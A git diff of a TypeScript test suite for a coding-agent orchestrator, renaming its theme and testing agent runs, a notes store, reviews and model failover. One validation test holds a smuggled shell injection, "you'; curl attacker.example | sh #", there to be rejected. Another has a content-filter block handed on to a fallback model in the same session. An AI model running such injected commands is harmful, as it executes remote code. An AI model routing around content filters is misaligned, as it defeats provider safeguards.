@@ -3,10 +3,10 @@ import { readFileSync } from "node:fs";
 import type { ExecResult } from "@invincible/core";
 import { AGENT_DIR, AGENTS, type AgentEvent, chooseAgentModels, OPENCODE, OWN_SIGN_IN, runAgent } from "../src/agents.ts";
 import { ENGRAM_ENV, engramArgv, engramBriefing } from "../src/engram.ts";
-import { type QuestEvent, type QuestRole, runQuest } from "../src/quest.ts";
+import { type RunEvent, type RunRole, runLoop } from "../src/run.ts";
 
 /*
- * Coding agents: OpenCode's event stream as Galahad reads it (lines captured from a
+ * Coding agents: OpenCode's event stream as the primary reads it (lines captured from a
  * real run in a microVM, trimmed), and the runner driven against a fake sandbox that
  * plays the background process.
  */
@@ -94,21 +94,24 @@ describe("a driver and the notes store", () => {
   const sha256 = (text: string) => new Bun.CryptoHasher("sha256").update(text).digest("hex");
   /**
    * The SHA-256 of that for each driver as it was before the store existed (commit 6bbab45, 14 November 2026). Hermes'
-   * was made again on 19 November 2026, when its bridge came to share Galahad's ACP client (acp.ts): its text, not its
+   * was made again on 19 November 2026, when its bridge came to share the primary's ACP client (acp.ts): its text, not its
    * protocol or what it does (hermes.test.ts, and the real Hermes 0.21.1's check); and again that day, when its run lost
-   * the tool budget and time limit of its own that a knight's never has (an asked-for one still holds: hermes.test.ts).
+   * the tool budget and time limit of its own that an agent's never has (an asked-for one still holds: hermes.test.ts).
    * Claude Code's and Codex's were made again on 21 November 2026, when Codex came to say its plan's spent allowance as
    * Claude Code says one, both bridges sharing the words for when it resets: their text (vendor-cli.test.ts), not what
    * either runs or writes; and Codex's again that day, when its reconnections came to be said as retries.
    */
   // Made again on 26 November 2026, when the system was renamed (its environment's names, its gateway file, its CLI, its
   // ports, its provider's name in Hermes' and Codex's configs) and the old 3D world's variable went from the bridges'
-  // list: each one's text with those put back hashes to its pin from before, so nothing else changed.
+  // list: each one's text with those put back hashes to its pin from before, so nothing else changed. And again that
+  // day, when the product's own name in them (its gateway's error words, its ACP client's name, OpenCode's session title)
+  // came to be Invincible, and the old theme's word for an agent became agent: word for word against the text before,
+  // nothing else differs.
   const BEFORE: Record<string, string> = {
-    opencode: "0f8ccc21a6ae5eda1f6a2e99597a0ca837af9b99406531dc07cd6b8cf527cbc9",
-    hermes: "abba23993196eef53267f6fbf919f7a46c7707c6b4b13114cb9e6d1e18d38f8e",
-    claude: "cb834acbe6d02f0cc1d1c96b54580b579698aedb221b59162f368b9c1d6b1e41",
-    codex: "1e52c1e40627089a32d44bb6c55bc0be761f3dd2248f649be23d15fbd9e489dc",
+    opencode: "cc015190084eb3e39e46df1c15f67e01bb085d0b6649cd5cb39fe5410b20ab22",
+    hermes: "bda176b38dd85803402b48ca52c796b08a0701a78a27eb753084feb047eee34e",
+    claude: "fa019317cf7c349083a1be670c2d6c96e8047e6cf1e831d3bb6bdd9fa78f8234",
+    codex: "36a54570657d25d9cbe6c56901974b073bab3acbea17e755f7ce19e135cffc1a",
   };
 
   test("without a notes project, every driver writes and runs byte for byte what it did before there was a store", () => {
@@ -131,7 +134,7 @@ describe("a driver and the notes store", () => {
       expect([name, text.includes("/work/.memory/engram")]).toEqual([name, true]);
       expect([name, text.includes("ENGRAM_NO_UPDATE_CHECK")]).toEqual([name, true]);
       expect([name, /ENGRAM_CLOUD|ENGRAM_URL|7437|mem_(context|session|judge|delete|merge|save_prompt)/.test(text)]).toEqual([name, false]);
-      // The project is a second knight's or a second repository's: nothing else of what is made changes with it.
+      // The project is a second agent's or a second repository's: nothing else of what is made changes with it.
       expect([name, made(driver, "other-repo")]).toEqual([name, text.replaceAll("you-project", "other-repo")]);
     }
   });
@@ -154,7 +157,7 @@ describe("a driver and the notes store", () => {
   });
 
   test("no driver names a file a vendor's tool keeps its own configuration in: nothing of the store is written there", () => {
-    for (const file of ["agents.ts", "acp.ts", "hermes.ts", "vendor-cli.ts", "engram.ts", "quest.ts", "agent-process.ts"]) {
+    for (const file of ["agents.ts", "acp.ts", "hermes.ts", "vendor-cli.ts", "engram.ts", "run.ts", "agent-process.ts"]) {
       const source = readFileSync(new URL(`../src/${file}`, import.meta.url), "utf8");
       expect([file, /\.claude\.json|config\.toml|\.codex\/|settings\.json|claude mcp add|plugin (install|add|marketplace)/.test(source)]).toEqual([file, false]);
     }
@@ -234,7 +237,7 @@ describe("running an agent", () => {
   });
 
   test("a run that can't start says why in its first line: a traceback's exception, not its heading", async () => {
-    // On 22 November 2026 a knight's trail said only "couldn't start opencode: Traceback (most recent call last):".
+    // On 22 November 2026 an agent's trail said only "couldn't start opencode: Traceback (most recent call last):".
     const exec = async (command: string): Promise<ExecResult> => {
       if (command.startsWith("mkdir -p")) return { exitCode: 1, stdout: "", stderr: "Traceback (most recent call last):\n  File \"<string>\", line 3, in <module>\nFileNotFoundError: [Errno 2] No such file or directory: '/work/.invincible-gateway.json'", durationMs: 1, truncated: false };
       return { exitCode: 0, stdout: command.startsWith("stat -c") ? "0\n" : "", stderr: "", durationMs: 1, truncated: false };
@@ -254,7 +257,7 @@ describe("running an agent", () => {
   });
 
   test("a run that can't be read for five minutes is stopped and failed, saying why, never waited on for ever", async () => {
-    // On 22 November 2026 a knight deleted its lease, every command in its VM failed from then on, and its task waited
+    // On 22 November 2026 an agent deleted its lease, every command in its VM failed from then on, and its task waited
     // on a run that had ended: each look that failed was taken as no news.
     const commands: string[] = [];
     let t = 0;
@@ -266,7 +269,7 @@ describe("running an agent", () => {
     // (Time moves as it waits between looks, ten seconds each.)
     const run = await runAgent(OPENCODE, { model, prompt: "x", session: null, deadline: Number.MAX_SAFE_INTEGER, workdir: "/work" }, { exec, sleep: async (ms) => void (t += ms), now: () => t });
     expect(run.status).toBe("failed");
-    expect(run.error).toBe("Galahad couldn't read how its run was going for 5 minutes, so it was stopped: FileNotFoundError: [Errno 2] No such file or directory: '/work/.invincible-gateway.json'");
+    expect(run.error).toBe("Invincible couldn't read how its run was going for 5 minutes, so it was stopped: FileNotFoundError: [Errno 2] No such file or directory: '/work/.invincible-gateway.json'");
     // About five minutes of looks, ten seconds apart, and its whole process group stopped.
     expect(commands.filter((c) => c.includes("d, off =")).length).toBeGreaterThan(25);
     expect(commands.filter((c) => c.includes("d, off =")).length).toBeLessThan(35);
@@ -320,11 +323,11 @@ describe("running an agent", () => {
   });
 });
 
-describe("a quest with a coding agent", () => {
+describe("a run with a coding agent", () => {
   test("a resumed task uses its saved harness session and persists a newly observed session before review", async () => {
     const box = sandbox([[LINES.start, LINES.text]]);
     const saved: string[] = [];
-    const outcome = await runQuest({ goal: "continue", environment: "a sandbox", plan: "Continue the task", agent: { driver: OPENCODE, models: [model], minutes: 1, workdir: "/work", session: "saved-session" } }, {
+    const outcome = await runLoop({ goal: "continue", environment: "a sandbox", plan: "Continue the task", agent: { driver: OPENCODE, models: [model], minutes: 1, workdir: "/work", session: "saved-session" } }, {
       exec: box.exec, sleep: noSleep,
       agentSession: async (id) => { await Promise.resolve(); saved.push(id); },
       ask: async () => { expect(saved).toEqual([SESSION]); return { text: "PASS", model: "test/reviewer" }; },
@@ -336,7 +339,7 @@ describe("a quest with a coding agent", () => {
   });
 
   test("plan, the agent's run, an independent review; the reviewer's notes continue the agent's session", async () => {
-    const replies: Record<QuestRole, string[]> = { planner: ["1. Fix calc.py.\nDone when: the test passes."], engineer: [], reviewer: ["REVISE\nAlso add a test for negative numbers.", "PASS\nBoth tests pass in the sandbox."] };
+    const replies: Record<RunRole, string[]> = { planner: ["1. Fix calc.py.\nDone when: the test passes."], engineer: [], reviewer: ["REVISE\nAlso add a test for negative numbers.", "PASS\nBoth tests pass in the sandbox."] };
     const box = sandbox([[LINES.start, LINES.shell, LINES.text]]);
     let runs = 0;
     const commands: string[] = [];
@@ -348,9 +351,9 @@ describe("a quest with a coding agent", () => {
       }
       return box.exec(command);
     };
-    const asked: QuestRole[] = [];
-    const events: QuestEvent[] = [];
-    const outcome = await runQuest(
+    const asked: RunRole[] = [];
+    const events: RunEvent[] = [];
+    const outcome = await runLoop(
       { goal: "make the test pass", environment: "a sandbox", evidence: ["cd /work/repo && git diff --stat"], agent: { driver: OPENCODE, models: [model], minutes: 30, workdir: "/work/repo" } },
       {
         ask: async (role) => {
@@ -380,24 +383,24 @@ describe("a quest with a coding agent", () => {
 describe("a bare coding tool", () => {
   test("as a person runs it: no plan, no reviewer; what it says is done is done, and its brief names neither", async () => {
     const box = sandbox([[LINES.start, LINES.shell, LINES.edit, LINES.text]]);
-    const asked: QuestRole[] = [];
-    const events: QuestEvent[] = [];
-    const outcome = await runQuest(
+    const asked: RunRole[] = [];
+    const events: RunEvent[] = [];
+    const outcome = await runLoop(
       { goal: "make the test pass", environment: "a sandbox", plan: "", unreviewed: true, agent: { driver: OPENCODE, models: [model], minutes: 30, workdir: "/work/repo" } },
       { ask: async (role) => (asked.push(role), { text: "PASS", model: `test/${role}` }), exec: box.exec, emit: (e) => events.push(e), sleep: noSleep },
     );
     expect([outcome.status, outcome.revisions, outcome.review]).toEqual(["done", 0, undefined]);
-    // None of Galahad's models was asked anything: the tool did the work, and its own word ended it.
+    // None of the primary's models was asked anything: the tool did the work, and its own word ended it.
     expect(asked).toEqual([]);
     expect(events.filter((e) => e.type === "plan" || e.type === "review")).toEqual([]);
     const launch = box.commands.find((c) => c.startsWith("mkdir -p /work/.agent"))!;
     const brief = Buffer.from(launch.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
-    expect(brief).toStartWith("Quest: make the test pass\n\nYou are working in: a sandbox\n");
+    expect(brief).toStartWith("Run: make the test pass\n\nYou are working in: a sandbox\n");
     expect(brief).not.toMatch(/\bplan(ner)?\b|\breviewer\b/i);
   });
 });
 
-describe("a quest with the notes store", () => {
+describe("a run with the notes store", () => {
   /** What a command wrote into the sandbox through base64 (a driver's file, an agent's message). */
   const decoded = (command: string) => Buffer.from(command.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
   const agent = { driver: OPENCODE, models: [model], minutes: 1, workdir: "/work/repo" };
@@ -405,7 +408,7 @@ describe("a quest with the notes store", () => {
   test("a coding agent is written the store's entry and told how far to trust a note; without the store neither is anywhere", async () => {
     const run = async (engram?: string) => {
       const box = sandbox([[LINES.start, LINES.text]]);
-      const outcome = await runQuest({ goal: "fix it", environment: "a sandbox", plan: "Fix it", agent, ...(engram ? { engram } : {}) }, { exec: box.exec, sleep: noSleep, ask: async () => ({ text: "PASS", model: "test/reviewer" }) });
+      const outcome = await runLoop({ goal: "fix it", environment: "a sandbox", plan: "Fix it", agent, ...(engram ? { engram } : {}) }, { exec: box.exec, sleep: noSleep, ask: async () => ({ text: "PASS", model: "test/reviewer" }) });
       expect(outcome.status).toBe("done");
       return { config: JSON.parse(decoded(box.commands[0]!)), message: decoded(box.commands.find((c) => c.startsWith("mkdir -p /work/.agent"))!), commands: box.commands };
     };
@@ -423,10 +426,10 @@ describe("a quest with the notes store", () => {
 
   test("the engineer's own loop is told the store's two shell commands, and its commands are run as it wrote them", async () => {
     const run = async (engram?: string) => {
-      const asked: { role: QuestRole; text: string }[] = [];
+      const asked: { role: RunRole; text: string }[] = [];
       const commands: string[] = [];
-      const replies: Record<QuestRole, string[]> = { planner: [], engineer: ["Look first.\n```sh\nengram search build commands --limit 5\n```", "DONE\nNothing to do."], reviewer: ["PASS"] };
-      await runQuest({ goal: "fix it", environment: "a sandbox", plan: "Fix it", ...(engram ? { engram } : {}) }, {
+      const replies: Record<RunRole, string[]> = { planner: [], engineer: ["Look first.\n```sh\nengram search build commands --limit 5\n```", "DONE\nNothing to do."], reviewer: ["PASS"] };
+      await runLoop({ goal: "fix it", environment: "a sandbox", plan: "Fix it", ...(engram ? { engram } : {}) }, {
         ask: async (role, messages) => { asked.push({ role, text: messages[0]!.content }); return { text: replies[role].shift()!, model: `test/${role}` }; },
         exec: async (command) => { commands.push(command); return { exitCode: 0, stdout: "", stderr: "", durationMs: 1, truncated: false }; },
       });
@@ -435,7 +438,7 @@ describe("a quest with the notes store", () => {
     const given = await run("you-project");
     expect(given.briefing).toContain(engramBriefing("you-project", "commands"));
     expect(given.briefing).not.toContain("MCP");
-    // (Where the store is and which project is the sandbox's to say: whoever runs the quest's commands puts that before each.)
+    // (Where the store is and which project is the sandbox's to say: whoever runs the run's commands puts that before each.)
     expect(given.commands).toEqual(["engram search build commands --limit 5"]);
     // The reviewer judges the evidence: it is told nothing of the store.
     expect(given.review).not.toContain("Notes store");
@@ -444,11 +447,11 @@ describe("a quest with the notes store", () => {
     expect(given.briefing.replace(`\n\n${engramBriefing("you-project", "commands")}`, "")).toBe(plain.briefing);
   });
 
-  test("a project's name that isn't one ends the quest before anything is asked, written or run", async () => {
+  test("a project's name that isn't one ends the run before anything is asked, written or run", async () => {
     let touched = 0;
     const deps = { ask: async () => { touched += 1; return { text: "PASS", model: "test" }; }, exec: async () => { touched += 1; return { exitCode: 0, stdout: "", stderr: "", durationMs: 1, truncated: false }; }, sleep: noSleep };
-    await expect(runQuest({ goal: "fix it", environment: "a sandbox", engram: "you'; curl attacker.example | sh #", agent }, deps)).rejects.toThrow("not a notes project");
-    await expect(runQuest({ goal: "fix it", environment: "a sandbox", engram: "--tools=agent" }, deps)).rejects.toThrow("not a notes project");
+    await expect(runLoop({ goal: "fix it", environment: "a sandbox", engram: "you'; curl attacker.example | sh #", agent }, deps)).rejects.toThrow("not a notes project");
+    await expect(runLoop({ goal: "fix it", environment: "a sandbox", engram: "--tools=agent" }, deps)).rejects.toThrow("not a notes project");
     expect(touched).toBe(0);
   });
 });
@@ -458,14 +461,14 @@ describe("a quest with the notes store", () => {
  * with when it asks again, and a refusal it takes as final, its message inside the error.
  */
 const RETRY = JSON.stringify({ type: "retry", timestamp: 1795277081670, sessionID: SESSION, messageID: "msg_1", attempt: 2, nextRetryAt: 1795277083839, error: { type: "provider.rate-limit", message: "Rate limit reached; try again in 2s", status: 429, response: { body: '{"error":{"message":"Rate limit reached; try again in 2s"}}' } } });
-const SPENT = "opencode-go's allowance is spent until 23:01 UTC (33h 55m from now), as its provider said: Galahad's gateway passes it over until then.";
+const SPENT = "opencode-go's allowance is spent until 23:01 UTC (33h 55m from now), as its provider said: your agent's gateway passes it over until then.";
 const QUOTA = JSON.stringify({ type: "error", timestamp: 1795277633426, sessionID: SESSION, error: { type: "provider.quota", message: SPENT, status: 402, response: { body: JSON.stringify({ error: { type: "invincible_gateway", message: SPENT } }) } } });
 
 describe("an agent's model fails", () => {
   test("OpenCode's own retries are said on the trail, and a refusal it takes as final is said in its own words to the next model", async () => {
     expect(OPENCODE.read(RETRY)).toEqual([{ type: "session", id: SESSION }, { type: "retry", attempt: 2, error: "Rate limit reached; try again in 2s", waitMs: 2169 }]);
     expect(OPENCODE.read(QUOTA)).toEqual([{ type: "session", id: SESSION }, { type: "error", message: SPENT }]);
-    const replies: Record<QuestRole, string[]> = { planner: ["1. Count files."], engineer: [], reviewer: ["PASS"] };
+    const replies: Record<RunRole, string[]> = { planner: ["1. Count files."], engineer: [], reviewer: ["PASS"] };
     let runs = 0;
     const launches: string[] = [];
     const exec = async (command: string): Promise<ExecResult> => {
@@ -480,8 +483,8 @@ describe("an agent's model fails", () => {
       }
       return ok(command.startsWith("stat") ? "0" : "");
     };
-    const events: QuestEvent[] = [];
-    const outcome = await runQuest(
+    const events: RunEvent[] = [];
+    const outcome = await runLoop(
       { goal: "inventory", environment: "a sandbox", agent: { driver: OPENCODE, models: [model, { provider: "deepseek", model: "deepseek-v4-pro" }], minutes: 30, workdir: "/work/repo" } },
       { ask: async (role) => ({ text: replies[role].shift()!, model: `test/${role}` }), exec, emit: (e) => events.push(e), sleep: noSleep },
     );
@@ -495,8 +498,8 @@ describe("an agent's model fails", () => {
     expect(second).not.toContain("provider.quota");
   });
 
-  test("the next model carries on the same session (seen live: a provider's content filter ended the quest)", async () => {
-    const replies: Record<QuestRole, string[]> = { planner: ["1. Count files."], engineer: [], reviewer: ["PASS"] };
+  test("the next model carries on the same session (seen live: a provider's content filter ended the run)", async () => {
+    const replies: Record<RunRole, string[]> = { planner: ["1. Count files."], engineer: [], reviewer: ["PASS"] };
     const filtered = JSON.stringify({ type: "provider.content-filter", message: "Provider blocked the response" });
     let runs = 0;
     const launches: string[] = [];
@@ -512,8 +515,8 @@ describe("an agent's model fails", () => {
       }
       return ok(command.startsWith("stat") ? "0" : "");
     };
-    const events: QuestEvent[] = [];
-    const outcome = await runQuest(
+    const events: RunEvent[] = [];
+    const outcome = await runLoop(
       {
         goal: "inventory",
         environment: "a sandbox",
@@ -528,7 +531,7 @@ describe("an agent's model fails", () => {
     expect(launches[1]).toContain("--session");
     expect(launches[1]).toContain(SESSION);
     const second = Buffer.from(launches[1]!.match(/printf %s '([A-Za-z0-9+/=]+)'/)![1]!, "base64").toString("utf8");
-    expect(second).toContain("Continue the quest from where you left off");
+    expect(second).toContain("Continue the run from where you left off");
     expect(second).toContain("Provider blocked the response");
     expect(events.find((e) => e.type === "retry")).toMatchObject({ role: "engineer", attempt: 1 });
   });
